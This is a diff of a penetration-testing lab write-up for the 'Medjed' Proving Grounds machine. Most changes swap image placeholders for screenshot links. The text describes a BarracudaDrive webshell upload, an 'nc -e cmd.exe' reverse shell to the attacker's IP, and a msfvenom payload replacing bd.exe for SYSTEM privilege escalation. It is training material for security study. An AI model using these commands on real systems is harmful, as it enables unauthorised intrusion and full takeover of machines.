@@ -1,7 +1,3 @@
-### Mind map
-
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed.png)
-
 ### Enumeration
 
 ```
@@ -431,37 +427,37 @@ OS and Service detection performed. Please report any incorrect results at https
 
 BarracudaDrive runs on port 8000.
 
-![image](1)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_15h51m17s_001.png)
 
 Browsing to Web-File-Server page.
 
-![image](2)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_15h52m30s_002.png)
 
 Following the instructions to create an admin account.
 
-![image](3)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_15h53m25s_003.png)
 
-![image](4)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_15h56m12s_004.png)
 
 Browsing to Web-File-Server page again. Clicking on the fs link which takes us to the disk browsing page.
 
-![image](5)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_15h56m40s_005.png)
 
-![image](6)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h01m34s_006.png)
 
 By doing a directory busting on port 45332 we find the phpinfo.php page and learn that the website file is located at C:\xampp\htdocs.
 
-![image](7)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h10m12s_007.png)
 
 Uploading php webshell file and Netcat program.
 
-![image](8)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h14m34s_008.png)
 
-![image](9)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h16m05s_009.png)
 
 Browsing to webshell page.
 
-![image](10)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h17m14s_010.png)
 
 Starting a listener and executing the reverse shell command.
 
@@ -469,31 +465,31 @@ Starting a listener and executing the reverse shell command.
 nc -e cmd.exe 192.168.49.109 8000
 ```
 
-![image](11)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h20m10s_011.png)
 
-![image](12)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h21m03s_012.png)
 
 ### Privilege Escalation
 
 We can find BarracudaDrive 6.5 has a insecure folder permissions exploit on exploit-db. We know that the BarracudaDrive version is also 6.5 through the about page of the website.
 
-![image](13)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h23m18s_013.png)
 
 Confirming execution privilege.
 
-![image](14)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h41m07s_014_.png)
 
 According to the vulnerability description we create a reverse shell payload.
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.109 LPORT=8000 -f exe > bd.exe
 ```
-![image](15)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_16h52m02s_015_.png)
 
 Uploading the payload file and replacing the original bd.exe.
 
-![image](16)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_18h09m14s_016.png)
 
 We reboot the machine and wait for a while to get the shell with nt authority\system permission.
 
-![image](17)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_18h09m42s_017.png)
